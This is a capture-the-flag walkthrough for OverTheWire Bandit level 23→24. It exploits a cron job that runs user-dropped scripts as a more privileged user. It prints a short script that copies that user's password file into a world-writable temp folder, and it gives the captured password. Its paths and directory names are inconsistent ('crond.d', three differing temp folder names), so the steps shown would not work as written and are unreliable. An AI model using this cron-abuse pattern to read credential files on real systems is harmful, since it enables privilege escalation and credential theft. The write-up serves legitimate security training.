Bandit Level 23 → Level 24
Level Goal
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…


Commands Used:
Navigating to ```/etc/crond.d```
```
$ cd /etc/crond.d
$ cat cronjob_bandit24.sh

```
We cat the current cronjob
```
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
The script executes and deletes all files in the folder ‘/var/spool/bandit24’. This is the case because it is run as bandit24 user, so the variable ‘myname’ contains the value ‘bandit24’. The for loop goes through the files. The first if statement makes sure the directories ‘.’ and ‘..’, which are representing the current and previous folders, are ignored. Inside the if statement is the code to execute a script, but only if the owner is bandit23. Then the file will be deleted.

Since we are currently logged in as bandit23 user, we can create a script that will give us the password for bandit24. First, create a file in the ’tmp’ folder. This prevents an early deletion of the file and you have a copy in case something went wrong. Then move the file to the folder ‘/var/spool/bandit24/foo’ and it will be executed.

```
$ mktemp -d
/tmp/tmp.dkrDx8OnVc
$ cd /tmp/tmp.dkrDx8OnVc
$ vim bandit24_pass.sh
```

We then write the shell script
```
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.pjGzidHvH/password
```
The cron job is executed by user bandit24 so when the job executes our script it is also going to have the permission of bandit24 which is not the same permission as we have because of this when the script tries to write output to the file called “password” it will fail so lets change the permission of all the files in the current folder so that any user can access them.

```
$ touch password
$ chmod 777 -R /tmp/tmp.dkrDx80nVC
$ cp bandit24_pass.sh /var/spool/bandit24/foo
$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```



Password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
